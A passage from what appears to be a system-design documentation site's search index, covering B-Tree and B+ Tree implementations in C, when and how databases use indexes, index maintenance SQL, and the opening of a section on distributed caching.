MIN_KEYS) {\n        int succ = bTreeGetSuccessor(node-&gt;children[idx + 1]);\n        node-&gt;keys[idx] = succ;\n        bTreeDeleteInternal(node-&gt;children[idx + 1], succ);\n    }\n    else {\n        bTreeMerge(node, idx);\n        bTreeDeleteInternal(node-&gt;children[idx], key);\n    }\n}\n\n// Internal delete helper\nvoid bTreeDeleteInternal(BTreeNode *node, int key) {\n    int idx = 0;\n    while (idx &lt; node-&gt;numKeys &amp;&amp; node-&gt;keys[idx] &lt; key) {\n        idx++;\n    }\n\n    if (idx &lt; node-&gt;numKeys &amp;&amp; node-&gt;keys[idx] == key) {\n        if (node-&gt;isLeaf) {\n            bTreeRemoveFromLeaf(node, idx);\n        } else {\n            bTreeRemoveFromNonLeaf(node, idx);\n        }\n    } else if (!node-&gt;isLeaf) {\n        int isInSubtree = (idx == node-&gt;numKeys);\n\n        if (node-&gt;children[idx]-&gt;numKeys &lt;= MIN_KEYS) {\n            bTreeFill(node, idx);\n        }\n\n        if (isInSubtree &amp;&amp; idx &gt; node-&gt;numKeys) {\n            bTreeDeleteInternal(node-&gt;children[idx - 1], key);\n        } else {\n            bTreeDeleteInternal(node-&gt;children[idx], key);\n        }\n    }\n}\n\n// Delete a key from B-Tree\nvoid bTreeDelete(BTreeNode **root, int key) {\n    if (*root == NULL) return;\n\n    bTreeDeleteInternal(*root, key);\n\n    // If root is empty after deletion, make its only child the new root\n    if ((*root)-&gt;numKeys == 0) {\n        BTreeNode *tmp = *root;\n        if ((*root)-&gt;isLeaf) {\n            *root = NULL;\n        } else {\n            *root = (*root)-&gt;children[0];\n        }\n        free(tmp);\n    }\n}\n\n// Print B-Tree (in-order traversal)\nvoid bTreePrint(BTreeNode *node, int level) {\n    if (node == NULL) return;\n\n    int i;\n    for (i = 0; i &lt; node-&gt;numKeys; i++) {\n        if (!node-&gt;isLeaf) {\n            bTreePrint(node-&gt;children[i], level + 1);\n        }\n        for (int j = 0; j &lt; level; j++) printf(\"  \");\n        printf(\"%d\\n\", node-&gt;keys[i]);\n    }\n    if (!node-&gt;isLeaf) {\n        bTreePrint(node-&gt;children[i], level + 1);\n    }\n}\n</code></pre>"},{"location":"system-design/high-level/concepts/database-indexing/#complete-b-tree-implementation_1","title":"Complete B+ Tree Implementation","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\n#define ORDER 4  // Maximum children per node\n#define MAX_KEYS (ORDER - 1)\n#define MIN_KEYS (ORDER / 2)\n\n// B+ Tree node structure\ntypedef struct BPlusNode {\n    int isLeaf;                          // 1 if leaf, 0 if internal\n    int numKeys;                         // Current number of keys\n    int keys[MAX_KEYS];                  // Keys array\n    void *data[MAX_KEYS];                // Data (only in leaf nodes)\n    struct BPlusNode *children[ORDER];   // Children (only in internal nodes)\n    struct BPlusNode *next;              // Next leaf (linked list)\n    struct BPlusNode *prev;              // Previous leaf (doubly-linked)\n    struct BPlusNode *parent;            // Parent pointer (for splits)\n} BPlusNode;\n\n// B+ Tree structure\ntypedef struct BPlusTree {\n    BPlusNode *root;\n    BPlusNode *firstLeaf;  // Pointer to leftmost leaf for sequential scan\n} BPlusTree;\n\n// Create a new B+ Tree node\nBPlusNode* createBPlusNode(int isLeaf) {\n    BPlusNode *node = (BPlusNode*)malloc(sizeof(BPlusNode));\n    node-&gt;isLeaf = isLeaf;\n    node-&gt;numKeys = 0;\n    node-&gt;next = NULL;\n    node-&gt;prev = NULL;\n    node-&gt;parent = NULL;\n\n    for (int i = 0; i &lt; ORDER; i++) {\n        node-&gt;children[i] = NULL;\n    }\n    for (int i = 0; i &lt; MAX_KEYS; i++) {\n        node-&gt;data[i] = NULL;\n    }\n\n    return node;\n}\n\n// Create a new B+ Tree\nBPlusTree* createBPlusTree() {\n    BPlusTree *tree = (BPlusTree*)malloc(sizeof(BPlusTree));\n    tree-&gt;root = NULL;\n    tree-&gt;firstLeaf = NULL;\n    return tree;\n}\n\n// Search for a key in B+ Tree (always goes to leaf)\nvoid* bPlusSearch(BPlusTree *tree, int key) {\n    if (tree-&gt;root == NULL) return NULL;\n\n    BPlusNode *current = tree-&gt;root;\n\n    // Traverse down to leaf level\n    while (!current-&gt;isLeaf) {\n        int i = 0;\n        while (i &lt; current-&gt;numKeys &amp;&amp; key &gt;= current-&gt;keys[i]) {\n            i++;\n        }\n        current = current-&gt;children[i];\n    }\n\n    // Search in leaf node\n    for (int i = 0; i &lt; current-&gt;numKeys; i++) {\n        if (current-&gt;keys[i] == key) {\n            return current-&gt;data[i];\n        }\n    }\n\n    return NULL;  // Not found\n}\n\n// Range query: Returns all keys between keyStart and keyEnd\nvoid bPlusRangeQuery(BPlusTree *tree, int keyStart, int keyEnd, \n                     void (*callback)(int key, void *data)) {\n    if (tree-&gt;root == NULL) return;\n\n    BPlusNode *current = tree-&gt;root;\n\n    // Find starting leaf\n    while (!current-&gt;isLeaf) {\n        int i = 0;\n        while (i &lt; current-&gt;numKeys &amp;&amp; keyStart &gt;= current-&gt;keys[i]) {\n            i++;\n        }\n        current = current-&gt;children[i];\n    }\n\n    // Scan leaf nodes using linked list\n    while (current != NULL) {\n        for (int i = 0; i &lt; current-&gt;numKeys; i++) {\n            if (current-&gt;keys[i] &gt;= keyStart &amp;&amp; current-&gt;keys[i] &lt;= keyEnd) {\n                callback(current-&gt;keys[i], current-&gt;data[i]);\n            }\n            if (current-&gt;keys[i] &gt; keyEnd) {\n                return;\n            }\n        }\n        current = current-&gt;next;  // Follow leaf link\n    }\n}\n\n// Find leaf node where key should be inserted\nBPlusNode* bPlusFindLeaf(BPlusNode *node, int key) {\n    if (node-&gt;isLeaf) {\n        return node;\n    }\n\n    int i = 0;\n    while (i &lt; node-&gt;numKeys &amp;&amp; key &gt;= node-&gt;keys[i]) {\n        i++;\n    }\n\n    return bPlusFindLeaf(node-&gt;children[i], key);\n}\n\n// Insert into a leaf node\nvoid bPlusInsertIntoLeaf(BPlusNode *leaf, int key, void *data) {\n    int i = leaf-&gt;numKeys - 1;\n\n    // Shift keys and data to make space\n    while (i &gt;= 0 &amp;&amp; key &lt; leaf-&gt;keys[i]) {\n        leaf-&gt;keys[i + 1] = leaf-&gt;keys[i];\n        leaf-&gt;data[i + 1] = leaf-&gt;data[i];\n        i--;\n    }\n\n    leaf-&gt;keys[i + 1] = key;\n    leaf-&gt;data[i + 1] = data;\n    leaf-&gt;numKeys++;\n}\n\n// Split a leaf node\nvoid bPlusSplitLeaf(BPlusTree *tree, BPlusNode *leaf, int key, void *data) {\n    // Create new leaf\n    BPlusNode *newLeaf = createBPlusNode(1);\n\n    // Temporary arrays for sorting\n    int tempKeys[ORDER];\n    void *tempData[ORDER];\n\n    // Copy existing keys and insert new key in sorted order\n    int i = 0, j = 0;\n    while (j &lt; leaf-&gt;numKeys) {\n        if (i == j &amp;&amp; key &lt; leaf-&gt;keys[j]) {\n            tempKeys[i] = key;\n            tempData[i] = data;\n            i++;\n        }\n        tempKeys[i] = leaf-&gt;keys[j];\n        tempData[i] = leaf-&gt;data[j];\n        i++;\n        j++;\n    }\n    if (i == j) {\n        tempKeys[i] = key;\n        tempData[i] = data;\n        i++;\n    }\n\n    // Split point\n    int split = (ORDER) / 2;\n\n    // First half stays in original leaf\n    leaf-&gt;numKeys = split;\n    for (i = 0; i &lt; split; i++) {\n        leaf-&gt;keys[i] = tempKeys[i];\n        leaf-&gt;data[i] = tempData[i];\n    }\n\n    // Second half goes to new leaf\n    newLeaf-&gt;numKeys = ORDER - split;\n    for (i = split, j = 0; i &lt; ORDER; i++, j++) {\n        newLeaf-&gt;keys[j] = tempKeys[i];\n        newLeaf-&gt;data[j] = tempData[i];\n    }\n\n    // Update leaf links\n    newLeaf-&gt;next = leaf-&gt;next;\n    if (leaf-&gt;next != NULL) {\n        leaf-&gt;next-&gt;prev = newLeaf;\n    }\n    leaf-&gt;next = newLeaf;\n    newLeaf-&gt;prev = leaf;\n\n    // Insert into parent\n    int newKey = newLeaf-&gt;keys[0];\n\n    if (leaf-&gt;parent == NULL) {\n        // Create new root\n        BPlusNode *newRoot = createBPlusNode(0);\n        newRoot-&gt;keys[0] = newKey;\n        newRoot-&gt;children[0] = leaf;\n        newRoot-&gt;children[1] = newLeaf;\n        newRoot-&gt;numKeys = 1;\n\n        leaf-&gt;parent = newRoot;\n        newLeaf-&gt;parent = newRoot;\n        tree-&gt;root = newRoot;\n    } else {\n        bPlusInsertIntoParent(tree, leaf-&gt;parent, newKey, newLeaf);\n    }\n}\n\n// Insert into internal node\nvoid bPlusInsertIntoNode(BPlusNode *node, int key, BPlusNode *rightChild) {\n    int i = node-&gt;numKeys - 1;\n\n    // Shift keys and children to make space\n    while (i &gt;= 0 &amp;&amp; key &lt; node-&gt;keys[i]) {\n        node-&gt;keys[i + 1] = node-&gt;keys[i];\n        node-&gt;children[i + 2] = node-&gt;children[i + 1];\n        i--;\n    }\n\n    node-&gt;keys[i + 1] = key;\n    node-&gt;children[i + 2] = rightChild;\n    rightChild-&gt;parent = node;\n    node-&gt;numKeys++;\n}\n\n// Split internal node\nvoid bPlusSplitInternal(BPlusTree *tree, BPlusNode *node, int key, BPlusNode *rightChild) {\n    BPlusNode *newNode = createBPlusNode(0);\n\n    // Temporary arrays\n    int tempKeys[ORDER];\n    BPlusNode *tempChildren[ORDER + 1];\n\n    // Copy existing and insert new in sorted order\n    int i = 0, j = 0;\n    for (i = 0; i &lt; node-&gt;numKeys; i++) {\n        if (j == i &amp;&amp; key &lt; node-&gt;keys[i]) {\n            tempKeys[j] = key;\n            tempChildren[j + 1] = rightChild;\n            j++;\n        }\n        tempKeys[j] = node-&gt;keys[i];\n        tempChildren[j] = node-&gt;children[i];\n        j++;\n    }\n    tempChildren[j] = node-&gt;children[i];\n\n    if (j == i) {\n        tempKeys[j] = key;\n        tempChildren[j + 1] = rightChild;\n        j++;\n    }\n\n    // Split point\n    int split = ORDER / 2;\n\n    // First half\n    node-&gt;numKeys = split;\n    for (i = 0; i &lt; split; i++) {\n        node-&gt;keys[i] = tempKeys[i];\n        node-&gt;children[i] = tempChildren[i];\n        tempChildren[i]-&gt;parent = node;\n    }\n    node-&gt;children[i] = tempChildren[i];\n    tempChildren[i]-&gt;parent = node;\n\n    // Second half\n    newNode-&gt;numKeys = ORDER - split - 1;\n    for (i = split + 1, j = 0; i &lt; ORDER; i++, j++) {\n        newNode-&gt;keys[j] = tempKeys[i];\n        newNode-&gt;children[j] = tempChildren[i];\n        tempChildren[i]-&gt;parent = newNode;\n    }\n    newNode-&gt;children[j] = tempChildren[i];\n    tempChildren[i]-&gt;parent = newNode;\n\n    // Key to move up\n    int upKey = tempKeys[split];\n\n    if (node-&gt;parent == NULL) {\n        // Create new root\n        BPlusNode *newRoot = createBPlusNode(0);\n        newRoot-&gt;keys[0] = upKey;\n        newRoot-&gt;children[0] = node;\n        newRoot-&gt;children[1] = newNode;\n        newRoot-&gt;numKeys = 1;\n\n        node-&gt;parent = newRoot;\n        newNode-&gt;parent = newRoot;\n        tree-&gt;root = newRoot;\n    } else {\n        bPlusInsertIntoParent(tree, node-&gt;parent, upKey, newNode);\n    }\n}\n\n// Insert into parent (handles splits)\nvoid bPlusInsertIntoParent(BPlusTree *tree, BPlusNode *parent, int key, BPlusNode *rightChild) {\n    if (parent-&gt;numKeys &lt; MAX_KEYS) {\n        bPlusInsertIntoNode(parent, key, rightChild);\n    } else {\n        bPlusSplitInternal(tree, parent, key, rightChild);\n    }\n}\n\n// Main insert function\nvoid bPlusInsert(BPlusTree *tree, int key, void *data) {\n    // Empty tree\n    if (tree-&gt;root == NULL) {\n        BPlusNode *leaf = createBPlusNode(1);\n        leaf-&gt;keys[0] = key;\n        leaf-&gt;data[0] = data;\n        leaf-&gt;numKeys = 1;\n        tree-&gt;root = leaf;\n        tree-&gt;firstLeaf = leaf;\n        return;\n    }\n\n    // Find leaf to insert\n    BPlusNode *leaf = bPlusFindLeaf(tree-&gt;root, key);\n\n    // If leaf has space\n    if (leaf-&gt;numKeys &lt; MAX_KEYS) {\n        bPlusInsertIntoLeaf(leaf, key, data);\n    } else {\n        // Split leaf\n        bPlusSplitLeaf(tree, leaf, key, data);\n    }\n}\n\n// Delete from leaf\nvoid bPlusDeleteFromLeaf(BPlusNode *leaf, int key) {\n    int i = 0;\n    while (i &lt; leaf-&gt;numKeys &amp;&amp; leaf-&gt;keys[i] != key) {\n        i++;\n    }\n\n    if (i == leaf-&gt;numKeys) return;  // Key not found\n\n    // Shift keys and data\n    for (int j = i; j &lt; leaf-&gt;numKeys - 1; j++) {\n        leaf-&gt;keys[j] = leaf-&gt;keys[j + 1];\n        leaf-&gt;data[j] = leaf-&gt;data[j + 1];\n    }\n    leaf-&gt;numKeys--;\n}\n\n// Borrow from left sibling (leaf)\nvoid bPlusBorrowFromLeftLeaf(BPlusNode *leaf, BPlusNode *leftSibling, int parentIdx) {\n    BPlusNode *parent = leaf-&gt;parent;\n\n    // Shift all keys in leaf to the right\n    for (int i = leaf-&gt;numKeys; i &gt; 0; i--) {\n        leaf-&gt;keys[i] = leaf-&gt;keys[i - 1];\n        leaf-&gt;data[i] = leaf-&gt;data[i - 1];\n    }\n\n    // Move last key from left sibling to first position of leaf\n    leaf-&gt;keys[0] = leftSibling-&gt;keys[leftSibling-&gt;numKeys - 1];\n    leaf-&gt;data[0] = leftSibling-&gt;data[leftSibling-&gt;numKeys - 1];\n    leaf-&gt;numKeys++;\n    leftSibling-&gt;numKeys--;\n\n    // Update parent key\n    parent-&gt;keys[parentIdx] = leaf-&gt;keys[0];\n}\n\n// Borrow from right sibling (leaf)\nvoid bPlusBorrowFromRightLeaf(BPlusNode *leaf, BPlusNode *rightSibling, int parentIdx) {\n    BPlusNode *parent = leaf-&gt;parent;\n\n    // Move first key from right sibling to last position of leaf\n    leaf-&gt;keys[leaf-&gt;numKeys] = rightSibling-&gt;keys[0];\n    leaf-&gt;data[leaf-&gt;numKeys] = rightSibling-&gt;data[0];\n    leaf-&gt;numKeys++;\n\n    // Shift all keys in right sibling to the left\n    for (int i = 0; i &lt; rightSibling-&gt;numKeys - 1; i++) {\n        rightSibling-&gt;keys[i] = rightSibling-&gt;keys[i + 1];\n        rightSibling-&gt;data[i] = rightSibling-&gt;data[i + 1];\n    }\n    rightSibling-&gt;numKeys--;\n\n    // Update parent key\n    parent-&gt;keys[parentIdx + 1] = rightSibling-&gt;keys[0];\n}\n\n// Merge with left sibling (leaf)\nvoid bPlusMergeWithLeftLeaf(BPlusTree *tree, BPlusNode *leaf, BPlusNode *leftSibling, int parentIdx) {\n    BPlusNode *parent = leaf-&gt;parent;\n\n    // Copy all keys from leaf to left sibling\n    for (int i = 0; i &lt; leaf-&gt;numKeys; i++) {\n        leftSibling-&gt;keys[leftSibling-&gt;numKeys + i] = leaf-&gt;keys[i];\n        leftSibling-&gt;data[leftSibling-&gt;numKeys + i] = leaf-&gt;data[i];\n    }\n    leftSibling-&gt;numKeys += leaf-&gt;numKeys;\n\n    // Update leaf links\n    leftSibling-&gt;next = leaf-&gt;next;\n    if (leaf-&gt;next != NULL) {\n        leaf-&gt;next-&gt;prev = leftSibling;\n    }\n\n    // Remove key from parent\n    for (int i = parentIdx; i &lt; parent-&gt;numKeys - 1; i++) {\n        parent-&gt;keys[i] = parent-&gt;keys[i + 1];\n        parent-&gt;children[i + 1] = parent-&gt;children[i + 2];\n    }\n    parent-&gt;numKeys--;\n\n    free(leaf);\n\n    // Handle parent underflow\n    if (parent-&gt;numKeys &lt; MIN_KEYS &amp;&amp; parent != tree-&gt;root) {\n        bPlusHandleUnderflow(tree, parent);\n    } else if (parent-&gt;numKeys == 0) {\n        tree-&gt;root = leftSibling;\n        leftSibling-&gt;parent = NULL;\n        free(parent);\n    }\n}\n\n// Handle underflow in internal nodes\nvoid bPlusHandleUnderflow(BPlusTree *tree, BPlusNode *node) {\n    // Implementation for internal node underflow handling\n    // Similar to leaf underflow but for internal nodes\n    // This would involve borrowing or merging with siblings\n}\n\n// Delete a key from B+ Tree\nvoid bPlusDelete(BPlusTree *tree, int key) {\n    if (tree-&gt;root == NULL) return;\n\n    BPlusNode *leaf = bPlusFindLeaf(tree-&gt;root, key);\n    bPlusDeleteFromLeaf(leaf, key);\n\n    // Handle underflow if necessary\n    if (leaf-&gt;numKeys &lt; MIN_KEYS &amp;&amp; leaf != tree-&gt;root) {\n        BPlusNode *parent = leaf-&gt;parent;\n\n        // Find position in parent\n        int idx = 0;\n        while (idx &lt;= parent-&gt;numKeys &amp;&amp; parent-&gt;children[idx] != leaf) {\n            idx++;\n        }\n\n        // Try to borrow from left sibling\n        if (idx &gt; 0 &amp;&amp; parent-&gt;children[idx - 1]-&gt;numKeys &gt; MIN_KEYS) {\n            bPlusBorrowFromLeftLeaf(leaf, parent-&gt;children[idx - 1], idx - 1);\n        }\n        // Try to borrow from right sibling\n        else if (idx &lt; parent-&gt;numKeys &amp;&amp; parent-&gt;children[idx + 1]-&gt;numKeys &gt; MIN_KEYS) {\n            bPlusBorrowFromRightLeaf(leaf, parent-&gt;children[idx + 1], idx);\n        }\n        // Merge with left sibling\n        else if (idx &gt; 0) {\n            bPlusMergeWithLeftLeaf(tree, leaf, parent-&gt;children[idx - 1], idx - 1);\n        }\n        // Merge with right sibling\n        else {\n            bPlusMergeWithLeftLeaf(tree, parent-&gt;children[idx + 1], leaf, idx);\n        }\n    }\n\n    // If root is empty, update tree\n    if (tree-&gt;root-&gt;numKeys == 0 &amp;&amp; !tree-&gt;root-&gt;isLeaf) {\n        BPlusNode *oldRoot = tree-&gt;root;\n        tree-&gt;root = tree-&gt;root-&gt;children[0];\n        tree-&gt;root-&gt;parent = NULL;\n        free(oldRoot);\n    }\n}\n\n// Print B+ Tree level by level\nvoid bPlusPrint(BPlusNode *node, int level) {\n    if (node == NULL) return;\n\n    for (int j = 0; j &lt; level; j++) printf(\"  \");\n    printf(\"Level %d [%s]: \", level, node-&gt;isLeaf ? \"LEAF\" : \"INTERNAL\");\n\n    for (int i = 0; i &lt; node-&gt;numKeys; i++) {\n        printf(\"%d \", node-&gt;keys[i]);\n    }\n    printf(\"\\n\");\n\n    if (!node-&gt;isLeaf) {\n        for (int i = 0; i &lt;= node-&gt;numKeys; i++) {\n            bPlusPrint(node-&gt;children[i], level + 1);\n        }\n    }\n}\n\n// Full sequential scan (uses linked leaves)\nvoid bPlusFullScan(BPlusTree *tree, void (*callback)(int key, void *data)) {\n    BPlusNode *leaf = tree-&gt;firstLeaf;\n\n    while (leaf != NULL) {\n        for (int i = 0; i &lt; leaf-&gt;numKeys; i++) {\n            callback(leaf-&gt;keys[i], leaf-&gt;data[i]);\n        }\n        leaf = leaf-&gt;next;\n    }\n}\n</code></pre>"},{"location":"system-design/high-level/concepts/database-indexing/#advantages-and-disadvantages","title":"Advantages and Disadvantages","text":"<p>B-Tree Advantages: - \u2705 Data can be found at any level (potentially faster for some searches) - \u2705 Slightly shorter tree height - \u2705 Good for random access patterns</p> <p>B-Tree Disadvantages: - \u274c Poor for range queries (no leaf links) - \u274c Fewer keys per internal node (data uses space) - \u274c Inconsistent search time (data at different levels)</p> <p>B+ Tree Advantages: - \u2705 Excellent for range queries (linked leaves) - \u2705 More keys per internal node (smaller tree) - \u2705 Faster full scans (just traverse leaf level) - \u2705 Consistent search time (always to leaf) - \u2705 Better cache locality (sequential leaf access)</p> <p>B+ Tree Disadvantages: - \u274c Always must go to leaf (one extra level sometimes) - \u274c Keys duplicated (in internal + leaf nodes)</p>"},{"location":"system-design/high-level/concepts/database-indexing/#additional-important-questions","title":"Additional Important Questions","text":""},{"location":"system-design/high-level/concepts/database-indexing/#q4-when-should-you-create-an-index","title":"Q4: When Should You Create an Index?","text":"<p>Create an index when:</p> <p>\u2705 Column frequently used in WHERE clause <pre><code>-- Query: SELECT * FROM users WHERE email = 'john@example.com'\nCREATE INDEX idx_email ON users(email);\n</code></pre></p> <p>\u2705 Column used in JOIN operations <pre><code>-- Query: SELECT * FROM orders JOIN users ON orders.user_id = users.id\nCREATE INDEX idx_user_id ON orders(user_id);\n</code></pre></p> <p>\u2705 Column used in ORDER BY <pre><code>-- Query: SELECT * FROM products ORDER BY price\nCREATE INDEX idx_price ON products(price);\n</code></pre></p> <p>\u2705 Table is large (&gt;100,000 rows) - Small tables: Full scan is often faster than index</p> <p>Do NOT create index when:</p> <p>\u274c Table is small (&lt;1,000 rows) \u274c Column has low cardinality (few distinct values)    - Example: gender (M/F) - only 2 values, index not helpful \u274c Column frequently updated    - Every update must update index \u274c Table has heavy INSERT/UPDATE workload    - Indexes slow down writes</p>"},{"location":"system-design/high-level/concepts/database-indexing/#q5-how-does-the-query-optimizer-use-indexes","title":"Q5: How Does the Query Optimizer Use Indexes?","text":"<p>Query Optimization Process:</p> <pre><code>-- Query\nSELECT * FROM users WHERE age &gt; 25 AND city = 'NYC';\n\n-- Optimizer checks:\n1. Indexes available?\n   - idx_age on (age)\n   - idx_city on (city)\n   - idx_age_city on (age, city)  \u2190 Composite\n\n2. Selectivity analysis:\n   - age &gt; 25: Returns 70% of rows (not selective)\n   - city = 'NYC': Returns 5% of rows (highly selective)\n   - Both: Returns 3% of rows\n\n3. Cost estimation:\n   - Full table scan: Read all 1,000 pages\n   - Use idx_age: Read index + fetch 700 pages (not good)\n   - Use idx_city: Read index + fetch 50 pages (good!)\n   - Use idx_age_city: Read index + fetch 30 pages (best!)\n\n4. Decision: Use idx_age_city (lowest cost)\n</code></pre> <p>View optimizer decision: <pre><code>EXPLAIN SELECT * FROM users WHERE age &gt; 25 AND city = 'NYC';\n</code></pre></p>"},{"location":"system-design/high-level/concepts/database-indexing/#q6-what-is-index-fragmentation-and-maintenance","title":"Q6: What is Index Fragmentation and Maintenance?","text":"<p>Index Fragmentation:</p> <p>Over time, indexes become fragmented due to INSERT/UPDATE/DELETE operations:</p> <pre><code>Healthy Index Page:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 [10] [20] [30] [40] [50] [60]  \u2502 \u2190 Full page, sequential\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nFragmented Index Page (after many operations):\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 [10] [__] [30] [__] [50] [__]  \u2502 \u2190 Gaps, wasted space\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Page Splits:</p> <p>When inserting into a full page: <pre><code>Before (full):\nPage 1: [10, 20, 30, 40]  \u2190 Full\n\nInsert 25:\nPage 1: [10, 20]           \u2190 Split\nPage 2: [25, 30, 40]       \u2190 New page\n\nResult: Pages not contiguous, poor sequential read performance\n</code></pre></p> <p>Maintenance Operations:</p> <p>1. Rebuild Index: <pre><code>ALTER INDEX idx_name REBUILD;\n-- Completely recreates index, removes fragmentation\n-- Offline operation (locks table)\n</code></pre></p> <p>2. Reorganize Index: <pre><code>ALTER INDEX idx_name REORGANIZE;\n-- Defragments leaf level, compacts pages\n-- Online operation (minimal locking)\n</code></pre></p> <p>3. Update Statistics: <pre><code>UPDATE STATISTICS users;\n-- Refreshes optimizer statistics\n-- Helps optimizer make better decisions\n</code></pre></p>"},{"location":"system-design/high-level/concepts/database-indexing/#summary","title":"Summary","text":"<p>Key Takeaways:</p> <ol> <li>Data Storage: Database uses pages (8KB blocks) to store data, managed by buffer manager</li> <li>Index Types: Clustered (physical order) vs Non-Clustered (separate structure with pointers)</li> <li>Data Structures: B+ Trees are optimal for databases due to linked leaves and range query efficiency</li> <li>Index Strategy: Create indexes on frequently queried columns, but balance against write performance</li> <li>Maintenance: Regularly rebuild/reorganize indexes to prevent fragmentation</li> </ol> <p>Performance Impact:</p> Operation Without Index With Index Improvement Point query O(n) - scan all rows O(log n) - tree search 100-1000x faster Range query O(n) - scan all rows O(log n + k) - k results 50-500x faster Sort O(n log n) - sort data O(1) - already sorted 10-100x faster INSERT O(1) - append O(log n) - update index 2-5x slower"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/","title":"Distributed Cache and Caching Strategies","text":""},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#youtube","title":"Youtube","text":"<ul> <li>19. System Design: Distributed Cache and Caching Strategies | Cache-Aside, Write-Through, Write-Back</li> </ul>"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#theory","title":"Theory","text":""},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#what-is-caching","title":"What is Caching?","text":"<p>Caching is a technique to store frequently accessed data in a fast-access storage layer (cache) to reduce latency and improve application performance. Instead of repeatedly fetching data from slow data sources (database, external API, disk), the application retrieves it from the cache.</p> <p>Key Benefits: - Reduced Latency: Cache reads are 10-100x faster than database queries - Lower Database Load: Fewer database queries reduce CPU, memory, and I/O usage - Improved Scalability: Handle more requests with same infrastructure - Cost Savings: Reduce expensive database or API calls - Better User Experience: Faster page loads and responses</p> <p>Cache Hierarchy: <pre><code>Fastest \u2191\n--------\nCPU Cache (L1, L2, L3) - Nanoseconds\nRAM (Application Cache) - Microseconds\nDistributed Cache (Redis, Memcached) - Milliseconds (1-5ms)\nDatabase - Tens of milliseconds (10-100ms)\nDisk - Milliseconds to seconds\nNetwork/API - Hundreds of milliseconds to seconds\n--------\nSlowest \u2193\n</code></pre></p>"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#distributed-cache","title":"Distributed Cache","text":"<p>A distributed cache is a caching system that spans multiple servers/nodes, allowing cached data to be shared across multiple application instances in a cluster.</p>"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#why-distributed-cache","title":"Why Distributed Cache?","text":"<p>Problem with Local Cache: <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510       \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510       \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  App Server \u2502       \u2502  App Server \u2502       \u2502  App Server \u2502\n\u2502      1      \u2502       \u2502      2      \u2502       \u2502      3      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Local Cache \u2502       \u2502 Local Cache \u2502       \u2502 Local Cache \u2502\n\u2502 user:1=John \u2502       \u2502 user:1=John \u2502       \u2502 user:1=Jane \u2502 \u2190 Inconsistent!\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2193                     \u2193                     \u2193\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502              Database                             \u2502\n   \u2502              user:1 = Jane (updated)              \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nProblem: After update, Server 1 and 2 have stale data!\n</code></pre></p> <p>Solution with Distributed Cache: <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510       \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510       \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  App Server \u2502       \u2502  App Server \u2502       \u2502  App Server \u2502\n\u2502      1      \u2502       \u2502      2      \u2502       \u2502      3      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518       